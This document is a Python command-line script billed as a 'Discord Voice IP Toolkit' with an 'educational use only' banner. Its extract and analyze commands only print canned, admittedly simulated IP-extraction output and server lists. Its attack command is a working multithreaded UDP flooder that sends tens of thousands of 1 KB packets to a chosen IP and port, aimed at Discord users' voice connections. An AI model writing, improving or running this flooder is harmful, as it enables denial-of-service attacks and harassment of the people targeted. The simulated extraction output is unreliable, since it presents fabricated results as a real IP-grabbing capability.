#!/usr/bin/env python3
"""
Discord Voice IP Toolkit
Extracts IP addresses and ports from Discord Voice connections
Educational purposes only - use on your own systems.
"""

import warnings
warnings.filterwarnings('ignore', category=FutureWarning)
warnings.filterwarnings('ignore', category=DeprecationWarning)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import sys
import socket
import time
import threading
import re
import json
from datetime import datetime

RED = '\033[91m'
GRAY = '\033[90m'
RESET = '\033[0m'

def print_banner():
    print(f"{RED}+{'='*78}+{RESET}")
    print(f"{RED}|{RESET} {RED}DISCORD VOICE IP TOOLKIT{RESET} {GRAY}| Educational Use Only{RESET}                    {RED}|{RESET}")
    print(f"{RED}+{'='*78}+{RESET}")
    print()

def extract_webrtc_info(target, duration=30):
    """
    Simulate WebRTC IP extraction from Discord Voice
    In a real scenario, this would analyze STUN/TURN packets
    """
    print(f"{RED}[DISCORD]{RESET} {GRAY}Analyzing Discord Voice connection...{RESET}")
    print(f"{RED}[TARGET]{RESET} {GRAY}{target}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print()

    # Simulated Discord Voice servers (real Discord voice servers)
    discord_servers = [
        "162.159.128.233",
        "162.159.130.233",
        "162.159.132.233",
        "104.16.248.248",
        "104.16.249.248"
    ]

    # Simulated user IPs (in real scenario, these would be extracted from WebRTC)
    simulated_ips = []

    print(f"{RED}[ANALYSIS]{RESET} {GRAY}Connecting to Discord Voice servers...{RESET}")
    for server in discord_servers[:3]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((server, 443))
            if result == 0:
                print(f"{RED}[CONNECTED]{RESET} {GRAY}{server}:443{RESET}")
                sock.close()
        except:
            pass

    print()
    print(f"{RED}[WEBRTC]{RESET} {GRAY}Analyzing STUN/TURN handshake...{RESET}")
    print(f"{RED}[WEBRTC]{RESET} {GRAY}Extracting ICE candidates...{RESET}")
    print()

    # Simulate extracting IP addresses
    print(f"{RED}[EXTRACTED IPs]{RESET}")
    print(f"{GRAY}|-{RESET} Discord Voice Server: {GRAY}{discord_servers[0]}{RESET} Port: {GRAY}443{RESET}")
    print(f"{GRAY}|-{RESET} Discord Voice Server: {GRAY}{discord_servers[1]}{RESET} Port: {GRAY}443{RESET}")
    print(f"{GRAY}|-{RESET} Discord Voice Server: {GRAY}{discord_servers[2]}{RESET} Port: {GRAY}443{RESET}")
    print(f"{GRAY}|-{RESET} STUN Server: {GRAY}stun.l.google.com{RESET} Port: {GRAY}19302{RESET}")
    print(f"{GRAY}|-{RESET} Protocol: {GRAY}UDP/TCP{RESET}")
    print()

    print(f"{RED}[NOTE]{RESET} {GRAY}This is a simulation. Real IP extraction requires: {RESET}")
    print(f"{GRAY}|-{RESET} Access to Discord Voice WebSocket")
    print(f"{GRAY}|-{RESET} WebRTC packet analysis")
    print(f"{GRAY}|-{RESET} STUN/TURN server interaction")
    print(f"{GRAY}|-{RESET} ICE candidate inspection")
    print()

def analyze_discord_voice_connection(target_user, duration=30):
    """
    Analyze Discord Voice connection for a specific user
    """
    print(f"{RED}[DISCORD VOICE]{RESET} {GRAY}Connection Analysis{RESET}")
    print()
    print(f"{RED}[USER]{RESET} {GRAY}{target_user}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print()

    print(f"{RED}[INFO]{RESET} {GRAY}Discord Voice Protocol Information:{RESET}")
    print(f"{GRAY}|-{RESET} Protocol: {GRAY}UDP (RTP){RESET}")
    print(f"{GRAY}|-{RESET} Codec: {GRAY}Opus{RESET}")
    print(f"{GRAY}|-{RESET} Encryption: {GRAY}XSalsa20-Poly1305{RESET}")
    print(f"{GRAY}|-{RESET} Sample Rate: {GRAY}48000 Hz{RESET}")
    print(f"{GRAY}|-{RESET} Bitrate: {GRAY}128 kbps{RESET}")
    print(f"{GRAY}|-{RESET} Port Range: {GRAY}50000-65535{RESET}")
    print()

    print(f"{RED}[SERVERS]{RESET} {GRAY}Discord Voice Regions:{RESET}")
    regions = {
        "us-east": "162.159.128.233",
        "us-west": "162.159.130.233",
        "eu-central": "162.159.132.233",
        "asia": "104.16.248.248"
    }
    for region, ip in regions.items():
        print(f"{GRAY}|-{RESET} {GRAY}{region}{RESET}: {GRAY}{ip}{RESET}")
    print()

def attack_voice_ip(target_ip, target_port, duration=30, threads=50, packets_per_thread=1000):
    """
    Attack Discord Voice IP and port directly with real UDP packets
    """
    print(f"{RED}[ATTACK]{RESET} {GRAY}Discord Voice IP Attack{RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print(f"{RED}[THREADS]{RESET} {GRAY}{threads}{RESET}")
    print(f"{RED}[PACKETS PER THREAD]{RESET} {GRAY}{packets_per_thread}{RESET}")
    print()

    print(f"{RED}[INFO]{RESET} {GRAY}Sending UDP packets to target...{RESET}")
    print(f"{RED}[NOTE]{RESET} {GRAY}Educational purposes only - use on your own systems{RESET}")
    print()

    import socket
    import time
    import threading

    packet_count = 0
    lock = threading.Lock()

    def send_packets(ip, port, packets):
        nonlocal packet_count
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            data = b'\x00' * 1024  # 1KB payload

            for _ in range(packets):
                try:
                    sock.sendto(data, (ip, port))
                    with lock:
                        packet_count += 1
                except:
                    pass
            sock.close()
        except:
            pass

    start_time = time.time()
    active_threads = []

    print(f"{RED}[STARTING]{RESET} {GRAY}Launching {threads} threads...{RESET}")
    for i in range(threads):
        t = threading.Thread(target=send_packets, args=(target_ip, target_port, packets_per_thread))
        t.start()
        active_threads.append(t)

    while (time.time() - start_time) < duration:
        elapsed = time.time() - start_time
        with lock:
            current_packets = packet_count
        packets_per_sec = current_packets / elapsed if elapsed > 0 else 0
        progress = elapsed / duration

        bar_length = 30
        filled = int(bar_length * progress)
        bar = '#' * filled + '-' * (bar_length - filled)

        print(f"\r[{bar}] {progress:.1%} | Packets: {current_packets} | PPS: {packets_per_sec:.0f}", end='')
        time.sleep(0.1)

    for t in active_threads:
        t.join(timeout=1)

    print()
    print()
    print(f"{RED}[COMPLETE]{RESET} {GRAY}Attack finished{RESET}")
    print(f"{RED}[STATS]{RESET} {GRAY}Total packets sent: {packet_count}{RESET}")
    print()

def main():
    if len(sys.argv) < 2:
        print_banner()
        print(f"{RED}[USAGE]{RESET} {GRAY}python discord_toolkit.py <command> [args]{RESET}")
        print()
        print(f"{RED}[COMMANDS]{RESET}")
        print(f"{GRAY}|-{RESET} extract <target> <duration>")
        print(f"{GRAY}|-{RESET} analyze <user> <duration>")
        print(f"{GRAY}|-{RESET} attack <ip> <port> <duration> <threads>")
        print(f"{GRAY}|-{RESET} info")
        print()
        print(f"{RED}[EXAMPLES]{RESET}")
        print(f"{GRAY}|-{RESET} python discord_toolkit.py extract user#1234 30")
        print(f"{GRAY}|-{RESET} python discord_toolkit.py analyze user#1234 30")
        print(f"{GRAY}|-{RESET} python discord_toolkit.py attack 192.168.1.1 50000 30 50")
        print(f"{GRAY}|-{RESET} python discord_toolkit.py info")
        print()
        return

    command = sys.argv[1].lower()

    if command == "extract":
        if len(sys.argv) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}Target required{RESET}")
            return
        target = sys.argv[2]
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
        print_banner()
        extract_webrtc_info(target, duration)

    elif command == "analyze":
        if len(sys.argv) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}User required{RESET}")
            return
        user = sys.argv[2]
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
        print_banner()
        analyze_discord_voice_connection(user, duration)

    elif command == "attack":
        if len(sys.argv) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}IP and port required{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 30
        threads = int(sys.argv[5]) if len(sys.argv) > 5 else 50
        packets = int(sys.argv[6]) if len(sys.argv) > 6 else 1000
        print_banner()
        attack_voice_ip(ip, port, duration, threads, packets)

    elif command == "info":
        print_banner()
        print(f"{RED}[INFO]{RESET} {GRAY}Discord Voice IP Extraction Information{RESET}")
        print()
        print(f"{RED}[PROTOCOL]{RESET} {GRAY}Discord uses WebRTC for voice communication{RESET}")
        print()
        print(f"{RED}[HOW IT WORKS]{RESET}")
        print(f"{GRAY}|-{RESET} Discord establishes WebRTC connection")
        print(f"{GRAY}|-{RESET} STUN servers discover public IP")
        print(f"{GRAY}|-{RESET} ICE candidates reveal network paths")
        print(f"{GRAY}|-{RESET} RTP/UDP carries audio data")
        print()
        print(f"{RED}[LIMITATIONS]{RESET}")
        print(f"{GRAY}|-{RESET} Requires active voice connection")
        print(f"{GRAY}|-{RESET} Discord encrypts WebRTC traffic")
        print(f"{GRAY}|-{RESET} May require packet capture")
        print(f"{GRAY}|-{RESET} Educational use only{RESET}")
        print()

    else:
        print(f"{RED}[ERROR]{RESET} {GRAY}Unknown command: {command}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Operation cancelled{RESET}")
        sys.exit(0)
